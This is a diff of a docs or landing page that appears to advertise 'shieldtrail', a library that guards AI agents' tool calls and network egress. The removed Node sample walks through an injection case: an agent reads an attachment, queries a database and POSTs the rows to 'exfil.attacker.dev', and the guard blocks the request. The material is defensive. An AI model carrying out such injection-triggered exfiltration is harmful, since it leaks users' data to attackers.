@@ -5,25 +5,19 @@ import { Footer, Nav } from '../components/Nav';
 import { TrailField } from '../components/TrailField';
 import { CLONE, dicts, type Lang } from '../i18n';
 
-const NODE = `import { createGuard, Baseline, GuardBlockedError } from 'shieldtrail';
+const NODE = `// lib/guard.ts — the rules live in shieldtrail.policy.json
+import { createGuard } from 'shieldtrail/node';
 
-const baseline = new Baseline();               // learns what is normal
-const guard = createGuard({
-  mode: 'shadow',                              // watch first, block later
-  allowedDomains: ['api.acme.com', '*.openai.com'],
-  observers: [baseline.observe],
+export const guard = createGuard({
+  secrets: [{ name: 'STRIPE_KEY', value: process.env.STRIPE_KEY, domains: ['api.stripe.com'] }],
 });
 
-const trace = guard.startTrace({
-  agent: 'support-bot',
-  task: 'Answer ticket #4521',
-  allowedTools: ['tickets.read', 'tickets.reply'],
-});
-
-await trace.context({ source: attachmentUrl, text: pdfText });  // what the agent reads
+// where your agent runs
+const trace = guard.startTrace({ agent: 'support-bot', task: 'Answer ticket #4521', allowedTools: ['tickets.*'] });
+await trace.context({ source: attachmentUrl, text: pdfText });   // what the agent reads
 const rows = await trace.tool('db.query', args, () => db.query(args));
-await trace.fetch('https://exfil.attacker.dev', { method: 'POST', body: rows });
-// in 'enforce' mode this throws GuardBlockedError: the request never leaves
+await trace.run(() => agent.next());   // every fetch inside goes through the rules
+// a request to an unknown domain after an injection throws GuardBlockedError: it never leaves
 
 console.log((await trace.chain()).narrative);`;
 
@@ -38,28 +32,32 @@ const mcp = guardMcpClient(client, trace, { server: 'helpdesk' });
 await mcp.listTools();
 await mcp.callTool({ name: 'db.query', arguments: { sql } });`;
 
-const NEXT = `// app/api/agent/route.ts
-import { createGuard, collectorExporter, GuardBlockedError } from 'shieldtrail';
+const NEXT = `// next.config.ts
+export default { serverExternalPackages: ['shieldtrail'] };
 
-const guard = createGuard({
-  mode: 'enforce',
-  exporters: [collectorExporter('http://127.0.0.1:4319')],
-});
+// app/layout.tsx — the dev panel, only in \`next dev\`
+{process.env.NODE_ENV === 'development' && <script src="http://127.0.0.1:4320/panel.js" async />}
+
+// app/api/refund/route.ts — rule "refund-needs-human" (action: "ask") waits for your click in the panel
+import { GuardBlockedError } from 'shieldtrail';
+import { guard } from '@/lib/guard';
 
 export async function POST(req: Request) {
-  const trace = guard.startTrace({ agent: 'copilot', task: 'chat' });
+  const { order, amount } = await req.json();
+  const trace = guard.startTrace({ agent: 'billing-bot', task: \`Refund order \${order}\` });
   try {
-    return Response.json(await runAgent(await req.json(), trace));
+    return Response.json({ id: await trace.tool('payments.refund', { order, amount }, () => refund(order, amount)) });
   } catch (err) {
-    if (err instanceof GuardBlockedError) return Response.json({ blocked: err.decision }, { status: 403 });
-    await trace.error(err);
+    if (err instanceof GuardBlockedError) return Response.json({ error: err.decision.reason }, { status: 403 });
     throw err;
   }
 }`;
 
-const CI = `# before each release: replay recorded traffic through the new rules
-npm run shieldtrail -- report events.jsonl
-npm run shieldtrail -- replay events.jsonl --policy policy.next.json
+const CI = `# before each release: check the rules against recorded traffic
+npm run shieldtrail -- check events.jsonl
+#   active    exfil-after-injection  decided 3×
+#   shadowed  partner-block  matches 1× but "unknown-domain" always decides first
+npm run shieldtrail -- replay events.jsonl
 #   + STOP  http https://api.partner.io/invoices  (alert → block, rule no-unknown-egress)
 #   exit code 1 → the new rules would break real traffic`;
 
